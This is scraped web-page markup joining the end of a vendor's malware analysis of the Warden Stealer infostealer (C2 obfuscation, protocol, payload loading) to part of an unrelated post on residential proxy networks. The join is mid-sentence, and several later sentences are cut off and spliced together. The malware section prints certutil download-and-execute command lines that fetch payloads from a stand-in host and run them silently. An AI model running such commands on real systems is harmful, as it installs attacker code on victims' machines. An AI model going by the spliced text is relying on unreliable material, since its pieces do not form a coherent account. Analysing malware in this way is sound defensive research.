\u003ccode\u003ev20_master_key\u003c/code\u003e.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-10/warden_stealer_figure_24.jpg.webp?itok=3KEbNK_w 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-10/warden_stealer_figure_24.jpg.webp?itok=Ztr-oKB7 2x","media":"(min-width: 1020px)","type":"image/webp","width":1170,"height":491},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-10/warden_stealer_figure_24.jpg.webp?itok=4phM9KkH 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-10/warden_stealer_figure_24.jpg.webp?itok=bkQRlokH 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":373},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-10/warden_stealer_figure_24.jpg.webp?itok=BHVeeP9s 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-10/warden_stealer_figure_24.jpg.webp?itok=gEYafS2Q 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":289}],"caption":"Figure 24: Warden Stealer building and injecting the shellcode responsible for decrypting the v20_master_key.","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-10/warden_stealer_figure_24.jpg.webp?itok=BHVeeP9s","link":""}]},{"bundle":"markdown","content":"\u003ch3\u003eC2 Communication\u003c/h3\u003e\n\u003cp\u003eEach Warden Stealer build comes with its own hardcoded set of C2 domains embedded directly in the binary. An individual build typically contains between one to five domains, with any additional ones serving as fallback endpoints in case a server becomes unavailable.\u003c/p\u003e\n\u003cp\u003eThese domains are protected by a dedicated obfuscation scheme, separate from the general-purpose string decoder, with each entry stored as a one-byte XOR key, a pointer to the encoded domain, and the encoded domain’s byte length. Notably, these three fields can appear in any order, likely as a result of the malware’s morphing.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-10/warden_stealer_figure_25.jpg.webp?itok=8NvybLpP 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-10/warden_stealer_figure_25.jpg.webp?itok=zNp_d6G9 2x","media":"(min-width: 1020px)","type":"image/webp","width":1170,"height":654},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-10/warden_stealer_figure_25.jpg.webp?itok=SYsT6c1k 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-10/warden_stealer_figure_25.jpg.webp?itok=99p-5xMJ 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":498},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-10/warden_stealer_figure_25.jpg.webp?itok=0qDSNnOv 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-10/warden_stealer_figure_25.jpg.webp?itok=4ysg7R3n 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":386}],"caption":"Figure 25: Example of Warden Stealer’s embedded C2 entries, each consisting of a one-byte XOR key, a pointer to the encoded domain, and the domain’s length.","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-10/warden_stealer_figure_25.jpg.webp?itok=0qDSNnOv","link":""}]},{"bundle":"markdown","content":"\u003cp\u003eThe actual communication with the C2 server is handled over HTTPS and relies on a custom binary format. Before being sent, each record is serialized, XOR-obfuscated with a build-specific byte, and prefixed with a frame tag. The resulting frame is then compressed using LZNT1 and wrapped with a header containing its uncompressed length, a 16-byte build marker, and optional metadata.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-10/warden_stealer_figure_26.jpg.webp?itok=Gvpka4hz 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-10/warden_stealer_figure_26.jpg.webp?itok=XZK3gNHR 2x","media":"(min-width: 1020px)","type":"image/webp","width":1170,"height":621},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-10/warden_stealer_figure_26.jpg.webp?itok=EDRKCCGK 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-10/warden_stealer_figure_26.jpg.webp?itok=gcoMhJpM 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":472},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-10/warden_stealer_figure_26.jpg.webp?itok=yVs6c_SH 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-10/warden_stealer_figure_26.jpg.webp?itok=RX8majw- 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":366}],"caption":"Figure 26: Structure of Warden Stealer’s outgoing C2 requests.","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-10/warden_stealer_figure_26.jpg.webp?itok=yVs6c_SH","link":""}]},{"bundle":"markdown","content":"\u003cp\u003eUsing this format, Warden Stealer first sends a registration request carrying a fingerprint of the infected system that includes the machine’s hardware identifier, CPU and memory details, OS version, display configuration, username, locales, and installed software. In response, the server returns the stealer’s dynamic configuration, which is XOR-obfuscated with the same build-specific byte as the outgoing records but, unlike them, is not LZNT1-compressed. If the exchange fails or the response contains no valid configuration, Warden Stealer falls back to the next C2 domain in the list. Once a valid configuration is obtained, Warden Stealer collects data according to the configured feature flags and collection rules and uploads the stolen data to the C2 server in batches.\u003c/p\u003e\n\u003cp\u003eAn example of Warden Stealer’s dynamic configuration is available on our \u003ca href=\"https://github.com/vojtechkrejsa/ioc/blob/master/WardenStealer/extras/warden_stealer_configuration.bin\"\u003eGitHub\u003c/a\u003e.\u003c/p\u003e\n\u003ch3\u003eExecution of Additional Payloads\u003c/h3\u003e\n\u003cp\u003eIn addition to its stealing capabilities, Warden Stealer can download and execute additional payloads from URLs supplied in its dynamic configuration. For each URL, it constructs a destination path under \u003ccode\u003e%TEMP%\u003c/code\u003e and downloads the file there using the \u003ccode\u003ecertutil.exe -urlcache -split -f \"\u0026lt;URL\u0026gt;\" \"\u0026lt;destination\u0026gt;\"\u003c/code\u003e command. The destination filename is derived from the \u003ccode\u003eGetTickCount\u003c/code\u003e value, formatted as eight zero-padded lowercase hexadecimal digits, followed directly by the URL’s zero-based position in the configuration list. The extension is selected by checking the URL text preceding any query string or fragment for \u003ccode\u003e.msi\u003c/code\u003e, \u003ccode\u003e.bat\u003c/code\u003e, or \u003ccode\u003e.cmd\u003c/code\u003e, with \u003ccode\u003e.exe\u003c/code\u003e used otherwise. Based on the selected extension, the payload is launched in one of the following ways:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMSI:\u003c/strong\u003e \u003ccode\u003emsiexec.exe /i \"\u0026lt;destination\u0026gt;\" /qn /norestart\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBAT/CMD:\u003c/strong\u003e \u003ccode\u003ecmd.exe /c \"\u0026lt;destination\u0026gt;\"\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eEXE (default):\u003c/strong\u003e the downloaded file is executed directly\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eTo carry out both the download and the execution steps, Warden Stealer leverages the \u003ccode\u003eShell.Application\u003c/code\u003e COM object (rather than calling \u003ccode\u003eCreateProcess\u003c/code\u003e directly). Through its \u003ccode\u003eIShellDispatch2\u003c/code\u003e interface, it invokes the \u003ca href=\"https://learn.microsoft.com/en-us/windows/win32/shell/ishelldispatch2-shellexecute\"\u003eShellExecute\u003c/a\u003e method to launch \u003ccode\u003ecmd.exe\u003c/code\u003e with a hidden window (\u003ccode\u003eSW_HIDE\u003c/code\u003e). The arguments passed to \u003ccode\u003ecmd.exe\u003c/code\u003e combine the \u003ccode\u003ecertutil\u003c/code\u003e download command with the appropriate payload invocation, chained with \u003ccode\u003e\u0026amp;\u0026amp;\u003c/code\u003e, so the payload is launched only if the download succeeds (or more precisely, if \u003ccode\u003ecertutil\u003c/code\u003e returns a successful exit code).\u003c/p\u003e\n\u003cp\u003eThe following examples illustrate the resulting command lines, assuming \u003ccode\u003e%TEMP%\u003c/code\u003e is \u003ccode\u003eC:\\Users\\user\\AppData\\Local\\Temp\u003c/code\u003e, \u003ccode\u003eGetTickCount\u003c/code\u003e returns \u003ccode\u003e0x1337\u003c/code\u003e for each item, and the URLs appear in the configuration in MSI, BAT, and EXE order:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMSI:\u003c/strong\u003e \u003ccode\u003ecmd.exe /c certutil.exe -urlcache -split -f \"https://example.com/payload.msi\" \"C:\\Users\\user\\AppData\\Local\\Temp\\000013370.msi\" \u0026amp;\u0026amp; msiexec.exe /i \"C:\\Users\\user\\AppData\\Local\\Temp\\000013370.msi\" /qn /norestart\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBAT:\u003c/strong\u003e \u003ccode\u003ecmd.exe /c certutil.exe -urlcache -split -f \"https://example.com/payload.bat\" \"C:\\Users\\user\\AppData\\Local\\Temp\\000013371.bat\" \u0026amp;\u0026amp; cmd.exe /c \"C:\\Users\\user\\AppData\\Local\\Temp\\000013371.bat\"\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eEXE:\u003c/strong\u003e \u003ccode\u003ecmd.exe /c certutil.exe -urlcache -split -f \"https://example.com/payload.exe\" \"C:\\Users\\user\\AppData\\Local\\Temp\\000013372.exe\" \u0026amp;\u0026amp; \"C:\\Users\\user\\AppData\\Local\\Temp\\000013372.exe\"\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eSummary\u003c/h2\u003e\n\u003cp\u003eWarden Stealer has rapidly emerged as one of the most prevalent infostealers we protect our users from, ranking on par with Amatera, Remus and Vidar. Written in Rust, it combines broad data-stealing capabilities with a dedicated custom loader and a built-in cryptocurrency clipper. It is actively developed and has been promoted on underground forums since August 2026, although we have been tracking its first builds since early May 2026.\u003c/p\u003e\n\u003cp\u003eIn this blog post, we showed how our investigation linked the malware we previously tracked as CallbackBeaver to Warden Stealer. This attribution draws on similarities between the analyzed samples and the authors’ public statements in underground forum posts and an interview, including details about the development timeline and loader and clipper capabilities.\u003c/p\u003e\n\u003cp\u003eWe also described a variety of the stealer’s obfuscation techniques and anti-VM checks, as well as its approach to bypassing Application-Bound Encryption to steal sensitive information from Chromium-based browsers. Notably, Warden Stealer is one of the first stealers actively targeting locally installed AI agents to exfiltrate access and refresh tokens, prompt histories, credentials stored in MCP configurations, and other sensitive developer-related information, highlighting the shift we have recently observed in the infostealer landscape.\u003c/p\u003e\n\u003ch2\u003eIndicators of Compromise (IoCs)\u003c/h2\u003e\n\u003cp\u003eA complete, much more extensive, IoC list is available on our \u003ca install an app that offers a reward, a premium feature or perhaps a little money in exchange for sharing some of your unused internet bandwidth. It sounds harmless enough. Your connection is idle most of the time anyway.\u003c/p\u003e\u003cp\u003eWhat may be less obvious is what that arrangement can mean in practice. Traffic from someone else can leave the internet through your home connection, using your residential IP address. To the website receiving that traffic, it can look as though the request came from you. \u003cstrong\u003eAnd if that traffic is malicious or abusive, it is your home IP address that is associated with it.\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eThat is the basic idea behind a residential proxy. Businesses use them for perfectly legitimate purposes, from price monitoring and ad verification to web scraping and \u003ca href=\"https://www.gendigital.com/blog/insights/research/the-ai-data-race\"\u003eAI data collection\u003c/a\u003e. But the model depends on something that is easy to overlook: every residential IP being sold has to belong to a real connection somewhere.\u003c/p\u003e\u003cp\u003eWe wanted to look at that side of the market.\u003c/p\u003e\u003cp\u003eHow many computers we protect are actually running software associated with residential proxy networks? Where are they? Which providers have the largest footprint? Are those residential proxy networks being misused?\u0026nbsp;\u0026nbsp;What kinds of threats are involved, and do they look the same from one provider to another?\u003c/p\u003e\u003cp\u003eAnd before we looked at any of that, we asked an even more basic question: do people actually understand what they are agreeing to?\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-09/1Researchataglance_0.png.webp?itok=UkzWXm0M with residential proxy ecosystems between January and mid-September 2026.\u003c/strong\u003e Phishing was the most prominent threat classification, with 5.15 million blocked attacks, followed by 1.26 million involving malvertising.\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"ec59d16726c7bd071fbc01940b1615690\"\u003e\u003cstrong\u003eThe geography of malicious activity does not simply mirror the geography of residential proxy installations.\u003c/strong\u003e The United States ranked only 10th in our September snapshot of active residential proxy software, with around 56,000 users, but 4th in blocked malicious activity, with more than 1.1 million attacks.\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"e98fe79ebb34c1567cb95df881e50cfc9\"\u003e\u003cstrong\u003eThe although their geographic distributions differ substantially.\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"ed7cfcec5f4de647ba0c48381878a0edc\"\u003e\u003cstrong\u003eThere is no single residential proxy threat profile.\u003c/strong\u003e Some provider ecosystems are dominated by phishing and malvertising, while others show much stronger associations with droppers, file infectors, NetNut is a subsidiary of Alarum Technologies, a publicly traded company listed on Nasdaq and the Tel Aviv Stock Exchange.\u0026nbsp;\u003ca href=\"https://www.sec.gov/Archives/edgar/data/1725332/000121390026075116/ea029701101ex99-1.htm\"\u003eOn July 2, Alarum disclosed\u003c/a\u003e that the FBI had seized domains associated with NetNut.\u0026nbsp;\u003ca href=\"https://www.sec.gov/Archives/edgar/data/1725332/000121390026075179/ea029704201ex99-1.htm\"\u003eAdditional domains were subsequently seized, services were disrupted\u003c/a\u003e, and Alarum later\u0026nbsp;\u003ca href=\"https://www.sec.gov/Archives/edgar/data/1725332/000121390026075170/ea029706002ex99-3.htm\"\u003eannounced a temporary pause\u003c/a\u003e of traffic through the affected network services while it investigated the incident.\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://cloud.google.com/blog/topics/threat-intelligence/google-continued-disruption-residential-proxy-networks\"\u003eGoogle Threat Intelligence Group\u003c/a\u003e, which took action in coordination with the FBI, Lumen and others, described NetNut as a residential proxy network also known as Popa. Google estimated it at least two million devices worldwide and said it observed 316 distinct threat clusters using suspected NetNut exit nodes during a single week in June, including cybercriminal and espionage groups. Google also said it had high confidence that many residential proxy brands were white-labeling the NetNut network.\u003c/p\u003e\u003cp\u003eLegal and corporate consequences followed.\u0026nbsp;\u003ca href=\"https://www.sec.gov/Archives/edgar/data/1725332/000121390026089059/ea0301943-6k_alarum.htm\"\u003eAlarum disclosed proceedings in Israel and a US class action complaint filed in New Jersey\u003c/a\u003e. The company said it was reviewing the proceedings with its legal advisers and intended to defend itself vigorously. The claims in those proceedings are allegations, not established findings.\u003c/p\u003e\u003cp\u003eOur telemetry adds a different piece to the story. In the first half of September, around two months after the law-enforcement action, we still observed software associated with NetNut on approximately 474,000 active Windows systems. At the same time, we did not observe corresponding NetNut proxy traffic from those installations. That is consistent with Alarum’s July announcement that traffic through the affected services had been paused.\u003c/p\u003e\u003cp\u003eIn other words, the software footprint remained, but the proxy activity did not. Domains can be seized quickly; software distributed across hundreds of thousands of computers does not disappear with them.\u003c/p\u003e"},{"bundle":"rich_text","content":"\u003ch2\u003eConfidence is much higher than understanding\u003c/h2\u003e\u003cp\u003eAgainst that telemetry, the results of our US survey become particularly revealing. In July 2026, we asked 1,000 adults what they knew about residential proxies and bandwidth sharing. At first glance, awareness did not look terrible: 13.9% said they understood what residential proxies were and how they worked, while another 13.2% said they had a basic idea. Combined, 27.1% believed they understood the technology to some degree.\u003c/p\u003e\u003cp\u003eWe then tested that understanding. Among the respondents who said they understood residential proxies, only 32.3% selected the correct explanation: that a residential proxy allows other people or companies to route internet traffic through a real user's home internet connection. Across the full sample, that leaves just 8.8% of US adults who both claimed some understanding and chose the correct definition.\u003c/p\u003e\u003cp\u003eThe terminology may be obscure, but the business model is more familiar. Some 17.2% of respondents said they currently use an app offering rewards, money, premium features or free access in exchange for sharing unused internet bandwidth, and another 12.2% said they had used one in the past. The survey was not designed to determine whether those specific apps were part of residential proxy networks, but the gap is striking: almost twice as many respondents said they currently use a bandwidth-sharing app as could correctly explain what a residential proxy does.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-09/6fromawareness_0.png.webp?itok=pJquOWWy 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-09/6fromawareness_0.png.webp?itok=a0EDGCZG 2x","media":"(min-width: 1020px)","type":"image/webp","width":1170,"height":658},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-09/6fromawareness_0.png.webp?itok=B3AHNsjl 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-09/6fromawareness_0.png.webp?itok=vC4BaEMF 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":501},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/6fromawareness_0.png.webp?itok=Y37L8L2C 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-09/6fromawareness_0.png.webp?itok=-CtK2QoS 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":388}],"caption":"","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/6fromawareness_0.png.webp?itok=Y37L8L2C","link":""}]},{"bundle":"rich_text","content":"\u003cp\u003eThe mismatch becomes clearer when we describe the behavior rather than the industry term. Only 25.1% expected 'sharing unused bandwidth' to mean that other people or companies might access websites through their home IP address, while 26.0% understood that their device could appear to websites as the source of somebody else's internet activity. Almost a third, 31.6%, said they would not know what the phrase meant.\u003c/p\u003e\u003cp\u003eWhen we asked how concerned people would be if an app allowed third parties to route internet traffic through their home connection, 76.5% said they would be very or somewhat concerned. Among that group, 55.5% worried about their home IP address being associated with suspicious or illegal activity, 51.5% about privacy, and 41.1% about accounts or services being blocked because suspicious traffic appeared to come from their IP address.\u003c/p\u003e\u003cp\u003eThose fears line up closely with the reason residential proxies are useful in the first place. Traffic inherits the characteristics and reputation of an ordinary consumer connection. For legitimate customers, that can make large-scale data collection or geographic testing possible. For an attacker, the same property can make malicious activity harder to distinguish from normal residential traffic. Our telemetry does not tell us whether any particular survey respondent's connection was used that way, but the 20.8 million attacks we blocked show that malicious use of residential proxy infrastructure is far from theoretical.\u003c/p\u003e\u003cp\u003eAsked whether they would install an app that allowed third parties to route traffic through their home connection in return for a small reward or free access, 53.4% said no. Another 26.7% said maybe, if the app was clear about what it did, and 20.0% said they definitely would. The survey covers US adults only, so these percentages should not be projected globally, but they underline a basic communication problem: 'share unused bandwidth' sounds very different from 'allow somebody else's traffic to leave the internet through your home IP address.'\u003c/p\u003e\u003ch2\u003eConsent, contracts and promises\u003c/h2\u003e\u003cp\u003eResidential proxy services have legitimate customers, and there are consumers who knowingly choose to exchange bandwidth for money, rewards or free services. The presence of residential proxy software on a machine, or even malicious traffic on a provider's network, does not by itself prove that a provider misled users or failed to enforce its policies.\u003c/p\u003e\u003cp\u003eConsent is still more complicated than a checkbox. There may be a proxy customer, a proxy provider, an application developer embedding an SDK, the consumer whose device supplies the residential IP, and an internet service provider whose connection is ultimately being used. Each relationship can carry different promises and restrictions.\u003c/p\u003e\u003cp\u003eSome residential ISP agreements, for example, explicitly restrict this kind of sharing. \u003ca href=\"https://www.verizon.com/support/fios-customer-agreement/\"\u003eVerizon's current Fios terms\u003c/a\u003e state that subscribers may not resell, re-provision or rent the service, or allow third parties outside normal guest Wi-Fi use to use it, and tell customers they are responsible for opting out of connected-device features that would violate those terms. That does not mean residential proxy software automatically breaches an ISP contract; terms vary by provider, country and service. It does show that the consumer's click on an application consent screen may not be the only agreement that matters.\u003c/p\u003e\u003cp\u003eThe industry also makes broader promises around ethical sourcing, informed consent, customer vetting and abuse prevention. Those promises are increasingly becoming testable rather than purely rhetorical. In July, the \u003ca href=\"https://www.amtso.org/news/amtso-testing-app-promises-guideline-paper-preprint-for-public-review/\"\u003eAnti-Malware Testing Standards Organization, AMTSO, published a draft framework\u003c/a\u003e for testing the explicit and implied promises made by applications and services. The draft has completed public review and is moving through final approval.\u003c/p\u003e\u003cp\u003eResidential proxies are one of the \u003ca href=\"https://www.amtso.org/wp-content/uploads/2026/07/AMTSO_App_Promises_Testing_Guidelines_Draft_For_Review.pdf\"\u003eworked examples in the draft\u003c/a\u003e. It specifically discusses testing claims around sourcing and consent, preventing abuse and misuse, protecting the consumer endpoint, and the fact that the paying proxy customer is not the same person as the consumer whose device or connection is being used. Gen participated in the working group that produced the draft.\u003c/p\u003e\u003cp\u003eOur research is not a compliance test against that framework, and the presence of malicious activity is not evidence by itself that a provider has broken a promise. What our data does show is why those promises deserve scrutiny. When a business depends on millions of residential IP addresses and sells access to third parties, questions about where those endpoints came from, what users agreed to and what controls are in place are part of the security model, not just the marketing.\u003c/p\u003e\u003ch2\u003eTrust is no longer enough\u003c/h2\u003e\u003cp\u003eResidential proxies are not going away. If anything, the demand for them is likely to grow as AI companies, data businesses and automated agents need more ways to access the public web at scale without every request coming from a data center.\u003c/p\u003e\u003cp\u003eThat makes the questions around these networks more important, not less.\u003c/p\u003e\u003cp\u003eA residential proxy provider can say that its endpoints are ethically sourced, that users have consented, that customers are vetted and that abuse is controlled. Those are reasonable promises to make. But once a network reaches millions of devices and carries traffic on this scale, they should also become promises that can be independently tested.\u003c/p\u003e\u003cp\u003eOur data does not show that residential proxy networks are inherently malicious. It shows something more useful: legitimate infrastructure can still carry a substantial amount of malicious activity, the threat profile can vary enormously from one network to another, and the people supplying the residential connections often understand far less about the technology than the industry around them does.\u003c/p\u003e\u003cp\u003eThat creates responsibilities on both sides of the market.\u003c/p\u003e\u003cp\u003eCustomers buying residential access should care about where those IP addresses came from and what controls exist around the network they are using. Providers should be able to demonstrate how endpoints are sourced, what users agreed to, how abuse is detected and what happens when those controls fail. And consumers should be told, in language they can actually understand, what it means when an application asks them to \"share unused bandwidth.\"\u003c/p\u003e\u003cp\u003eThe residential proxy industry has spent years making it easier to buy access to someone else's IP address.\u003c/p\u003e\u003cp\u003eThe next challenge is proving that everyone involved understands, and can trust, what happens after that access is sold.\u003c/p\u003e\u003ch2\u003eMethodology\u003c/h2\u003e\u003ch3\u003eInstallation telemetry\u003c/h3\u003e\u003cp\u003eGen Threat Labs developed telemetry to identify Windows software associated with selected commercial residential proxy providers. The installation data used in this research covers active systems observed between September 1 and September 15, 2026.\u003c/p\u003e\u003cp\u003eThe figures in the article are active-user populations derived from Gen telemetry. A computer had to be active and connected during the observation period to appear. User counts in the provider, software-path and country views used in the analysis are deduplicated within those views.\u003c/p\u003e\u003cp\u003eThe installation data represents the Gen Windows user population. It should not be interpreted as a census of every residential proxy endpoint worldwide or as a measure of commercial market share.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eDisclosure:\u003c/strong\u003e Gen uses Bright Data proxy and browser infrastructure in some privacy and reputation services. Bright Data had no involvement in this research, and the findings are based on Gen Threat Labs telemetry and security detections.\u003c/p\u003e\u003ch3\u003eMalicious traffic\u003c/h3\u003e\u003cp\u003eThe malicious-traffic analysis covers January through mid-September 2026 and focuses on attacks associated with the residential proxy providers included in the study.\u003c/p\u003e\u003cp\u003eProtected users are unique users for whom Gen blocked at least one attack associated with a provider. Blocked attacks are deduplicated at the malicious-event level, so multiple detections triggered by the same event do not inflate the provider-level total.\u003c/p\u003e\u003cp\u003eFor the geographic view of malicious activity, country refers to the location of the residential proxy exit node.\u0026nbsp;\u003c/p\u003e\u003ch3\u003eAppendix: Key telemetry data\u003c/h3\u003e\u003cp\u003eInstallation telemetry in this appendix refers to Gen-protected Windows users on whose devices we observed software associated with residential proxy providers during the research period.
